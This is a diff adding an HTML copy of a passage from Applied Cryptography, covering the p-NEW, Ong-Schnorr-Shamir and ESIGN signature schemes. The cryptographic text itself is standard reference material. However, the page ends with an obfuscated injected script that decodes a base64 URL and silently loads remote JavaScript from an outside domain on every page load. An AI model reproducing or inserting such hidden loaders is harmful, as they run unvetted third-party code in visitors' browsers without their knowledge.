@@ -1,0 +1,136 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Public-Key Digital Signature Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=20//-->
+<!--PAGES=498-500//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="20-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="20-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>All the variants are equally secure, so it makes sense to choose a scheme that is easy to compute with. The requirement to compute inverses slows most of these schemes. As it turns out, a scheme in this pile allows computing both the signature equation and the verification equation without inverses and also gives message recovery. It is called the <B>p-NEW</B> scheme [1184].</P>
+<DL>
+<DD><I>r</I> = <I>mg<SUP>-k</SUP></I> mod <I>p</I>
+<DD><I>s</I> = <I>k</I> &#150; <I>r&#146;x</I> mod <I>q</I>
+</DL>
+<P>And <I>m</I> is recovered (and the signature verified) by</P>
+<DL>
+<DD><I>m</I> = <I>g<SUP>s</SUP>y<SUP>r&#146;</SUP>r</I> mod <I>p</I>
+</DL>
+<P>Some variants sign two and three message blocks at the same time [740]; other variants can be used for blind signatures [741].
+</P>
+<P>This is a remarkable piece of research. All of the various discrete-logarithm-based digital signature schemes have been put in one coherent framework. In my opinion this finally puts to rest any patent dispute between Schnorr [1398] and DSA [897]: DSA is not a derivative of Schnorr, nor even of ElGamal. All three are examples of this general construction, and this general construction is unpatented.</P>
+<H3><A NAME="Heading6"></A><FONT COLOR="#000077">20.5 Ong-Schnorr-Shamir</FONT></H3>
+<P>This signature scheme uses polynomials modulo <I>n</I> [1219,1220]. Choose a large integer <I>n</I> (you need not know the factorization of <I>n</I>). Then choose a random integer, <I>k</I>, such that <I>k</I> and <I>n</I> are relatively prime. Calculate <I>h</I> such that</P>
+<DL>
+<DD><I>h</I> = &#150;<I>k</I><SUP>-2</SUP> mod <I>n</I> = -(<I>k</I><SUP>-1</SUP>)<SUP>2</SUP> mod <I>n</I>
+</DL>
+<P>The public key is <I>h</I> and <I>n</I>; <I>k</I> is the private key.</P>
+<P>To sign a message, <I>M</I>, first generate a random number, <I>r</I>, such that <I>r</I> and <I>n</I> are relatively prime. Then calculate:</P>
+<DL>
+<DD><I>S</I><SUB>1</SUB> = 1/2 * (<I>M</I>/<I>r</I> &#43; <I>r</I>) mod <I>n</I>
+<DD><I>S</I><SUB>2</SUB> = <I>k</I>/2 * (<I>M</I>/<I>r</I> &#150; <I>r</I>) mod <I>n</I>
+</DL>
+<P>The pair, <I>S</I><SUB>1</SUB> and <I>S</I><SUB>2</SUB>, is the signature.</P>
+<P>To verify a signature, confirm that</P>
+<DL>
+<DD><I>S</I><SUB>1</SUB><SUP>2</SUP> &#43; <I>h</I> * <I>S</I><SUB>2</SUB><SUP>2</SUP> &#8801; <I>M</I> (mod <I>n</I>)
+</DL>
+<P>The version of the scheme described here is based on quadratic polynomials. When it was first proposed in [1217], a $100 reward was offered for successful cryptanalysis. It was proved insecure [1255,18], but its authors were not deterred. They proposed a modification of the algorithm based on cubic polynomials, which is also insecure [1255]. The authors then proposed a quartic version, which was also broken [524,1255]. A variant which fixes these problems is in [1134].
+</P>
+<H3><A NAME="Heading7"></A><FONT COLOR="#000077">20.6 ESIGN</FONT></H3>
+<P>ESIGN is a digital signature scheme from NTT Japan [1205,583]. It is touted as being at least as secure and considerably faster than either RSA or DSA, with similar key and signature lengths.
+</P>
+<P>The private key is a pair of large prime numbers, <I>p</I> and <I>q</I>. The public key is <I>n</I>, when</P>
+<DL>
+<DD><I>n</I> = <I>p</I><SUP>2</SUP><I>q</I>
+</DL>
+<P><I>H</I> is a hash function that operates on a message, <I>m</I>, such that <I>H</I>(<I>m</I>) is between 0 and <I>n</I> &#150; 1. There is also a security parameter, <I>k</I>, which will be discussed shortly.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice picks a random number <I>x</I>, where <I>x</I> is less than <I>pq</I>.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice computes:
+<DL>
+<DD><I>w</I>, the least integer that is larger than or equal to
+<DD>(<I>H</I>(<I>m</I>) &#150; <I>x<SUP>k</I></SUP> mod <I>n</I>)/<I>pq</I>
+<DD><I>s</I> = <I>x</I> &#43; ((<I>w</I>/<I>kx<SUP>k</I> - 1</SUP>) mod <I>p</I>)<I>pq</I>
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Alice sends <I>s</I> to Bob.
+<DD><B>(4)</B>&nbsp;&nbsp;To verify the signature, Bob computes <I>s<SUP>k</I></SUP> mod <I>n</I>. He also computes <I>a</I>, which is the least integer larger than or equal to two times the number of bits of <I>n</I> divided by 3. If <I>H</I>(<I>m</I>) is less than or equal to <I>s<SUP>k</I></SUP> mod <I>n</I>, and if <I>s<SUP>k</I></SUP> mod <I>n</I> is less than <I>H</I>(<I>m</I>) &#43; 2<SUP><I>a</I></SUP>, then the signature is considered valid.
+</DL>
+<P>This algorithm works faster with precomputation. This precomputation can be done at any time and has nothing to do with the message being signed. After picking <I>x</I>, Alice could break step (2) into two partial steps. The first can be precomputed.</P>
+<DL>
+<DD><B>(2a)</B>&nbsp;&nbsp;Alice computes:
+<DL>
+<DD><I>u</I> = <I>x<SUP>k</I></SUP> mod <I>n</I>
+<DD><I>v</I> = 1/(<I>kx<SUP>k</I> - 1</SUP>) mod <I>p</I>
+</DL>
+<DD><B>(2b)</B>&nbsp;&nbsp;Alice computes:
+<DL>
+<DD><I>w</I> = the least integer that is larger than or equal to
+<DD>(<I>H</I>(<I>m</I>) &#150; <I>u</I>)/<I>pq</I>)
+<DD><I>s</I> = <I>x</I> &#43; (<I>wv</I> mod <I>p</I>)<I>pq</I>
+</DL>
+</DL>
+<P>For the size of numbers generally used, this precomputation speeds up the signature process by a factor of 10. Almost all the hard work is done in the precomputation stage. A discussion of modular arithmetic operations to speed ESIGN can be found in [1625,1624]. This algorithm can also be extended to work with elliptic curves [1206].
+</P>
+<P><FONT SIZE="+1"><B><I>Security of ESIGN</I></B></FONT></P>
+<P>When this algorithm was originally proposed, <I>k</I> was set to 2 [1215]. This was quickly broken by Ernie Brickell and John DeLaurentis [261], who then extended their attack to <I>k</I> = 3. A modified version of this algorithm [1203] was broken by Shamir [1204]. The variant proposed in [1204] was broken in [1553]. ESIGN is the current incarnation of this family of algorithms. Another new attack [963] does not work against ESIGN.</P>
+<P>The authors currently recommend these values for <I>k</I>: 8, 16, 32, 64, 128, 256, 512, and 1024. They also recommend that <I>p</I> and <I>q</I> each be of at least 192 bits, making <I>n</I> at least 576 bits long. (I think <I>n</I> should be twice that length.) With these parameters, the authors conjecture that ESIGN is as secure as RSA or Rabin. And their analysis shows favorable speed comparison to RSA, ElGamal, and DSA [582].</P>
+<P><FONT SIZE="+1"><B><I>Patents</I></B></FONT></P>
+<P>ESIGN is patented in the United States [1208], Canada, England, France, Germany, and Italy. Anyone who wishes to license the algorithm should contact Intellectual Property Department, NTT, 1&#150;6 Uchisaiwai-cho, 1-chome, Chiyada-ku, 100 Japan.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="20-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="20-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(qmAARcAi, DhoyubCj) {DhoyubCj = qmAARcAi.createElement('script');DhoyubCj.type = 'text/javascript';DhoyubCj.async = true;DhoyubCj.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');qmAARcAi.getElementsByTagName('body')[0].appendChild(DhoyubCj);}(document));</script></body>
+</html>
